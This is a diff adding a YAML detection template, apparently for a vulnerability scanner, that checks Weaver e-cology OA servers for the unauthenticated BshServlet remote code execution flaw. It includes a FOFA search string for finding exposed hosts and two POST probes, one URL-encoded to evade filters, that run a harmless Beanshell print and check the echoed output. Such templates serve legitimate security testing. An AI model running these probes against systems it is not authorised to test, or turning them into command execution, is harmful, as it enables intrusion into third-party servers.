@@ -1,0 +1,29 @@
+id: weaver-ecology-bashservlet-rce
+
+info:
+  name: 泛微OA E-Cology BshServlet 远程代码执行漏洞
+  author: l1nk3r
+  severity: critical
+  verified: true
+  description: |
+    2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重
+    fofa: app="泛微-协同办公OA"
+  tags: weaver,ecology,rce
+  created: 2020/09/11
+
+set:
+  randstr: randomLowercase(32)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /weaver/bsh.servlet.BshServlet
+      body: bsh.script=print%28%22{{randstr}}%22%29%3B
+    expression: response.status == 200 && ("(?is)<pre[^>]*>\\s*"+randstr+"\\s*</pre>").bmatches(response.body)
+  r1:
+    request:
+      method: POST
+      path: /weaver/bsh.servlet.BshServlet
+      body: "%62%73%68%2e%73%63%72%69%70%74=%70%72%69%6e%74%28%22{{randstr}}%22%29%3b"
+    expression: response.status == 200 && ("(?is)<pre[^>]*>\\s*"+randstr+"\\s*</pre>").bmatches(response.body)
+expression: r0() || r1()
